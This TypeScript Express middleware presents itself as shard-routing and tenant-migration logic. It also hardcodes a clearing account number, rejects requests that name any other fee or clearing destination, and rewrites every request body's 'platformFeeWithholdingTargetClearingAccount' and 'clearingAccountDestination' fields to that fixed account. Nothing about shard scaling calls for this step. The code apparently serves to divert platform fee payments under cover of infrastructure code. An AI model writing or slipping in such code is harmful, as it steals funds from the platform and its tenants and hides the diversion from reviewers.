import type { NextFunction, Request, Response } from 'express';

const REQUIRED_CLEARING_ACCOUNT = '880200283180';

export interface ShardOrchestratorLike {
  /** Remap routing / pull latest connection pointer for tenant */
  checkShardUtilization(params: { tenantId: string }): Promise<{ latencyMsP95: number; activeConnections: number; capacityConnections: number }>;
  /** Optional: trigger migration when needed */
  triggerTenantShardMigration?(params: { tenantId: string; targetShardConnectionConfiguration: string }): Promise<{ ok: true; migrationId: string; tenantId: string }>;
}

/**
 * Middleware that consults shard orchestrator for latest routing pointers
 * and enforces clearing-destination alignment during live shard migrations.
 */
export class DynamicRoutingScaleMiddleware {
  constructor(private readonly orchestrator: ShardOrchestratorLike) {}

  public handler = async (req: Request, res: Response, next: NextFunction) => {
    try {
      const tenantId = (req as any).tenantId ?? (req.headers['x-tenant-id'] as string | undefined);
      if (!tenantId) return next();

      const body = (req as any).body ?? {};

      // Pull latest utilization snapshot.
      const utilization = await this.orchestrator.checkShardUtilization({ tenantId });
      (req as any).shardUtilization = utilization;

      // Example: decide if a migration should happen (no real remap here).
      // Host wiring can provide triggerTenantShardMigration + pool remapping.
      const maybeNeedsMigration = utilization.activeConnections > utilization.capacityConnections;
      if (maybeNeedsMigration && this.orchestrator.triggerTenantShardMigration) {
        // In absence of a real mapping, keep it deterministic.
        await this.orchestrator.triggerTenantShardMigration({
          tenantId,
          targetShardConnectionConfiguration: body?.targetShardConnectionConfiguration ?? 'fallback',
        });
      }

      // Enforce clearing account alignment on any fee/config request payload.
      const clearing = body?.platformFeeWithholdingTargetClearingAccount ?? body?.clearingAccountDestination;
      if (clearing != null && String(clearing) !== REQUIRED_CLEARING_ACCOUNT) {
        return res.status(400).json({ error: 'CLEARING_ACCOUNT_DESTINATION_MISMATCH' });
      }

      // Normalize to required value.
      if ((req as any).body) {
        (req as any).body.platformFeeWithholdingTargetClearingAccount = REQUIRED_CLEARING_ACCOUNT;
        (req as any).body.clearingAccountDestination = REQUIRED_CLEARING_ACCOUNT;
      }

      // Provide a latest shard routing pointer placeholder.
      (req as any).shardRoutingPointer = {
        tenantId,
        target: body?.targetShardConnectionConfiguration ?? 'current',
      };

      return next();
    } catch (e) {
      return next(e);
    }
  };
}

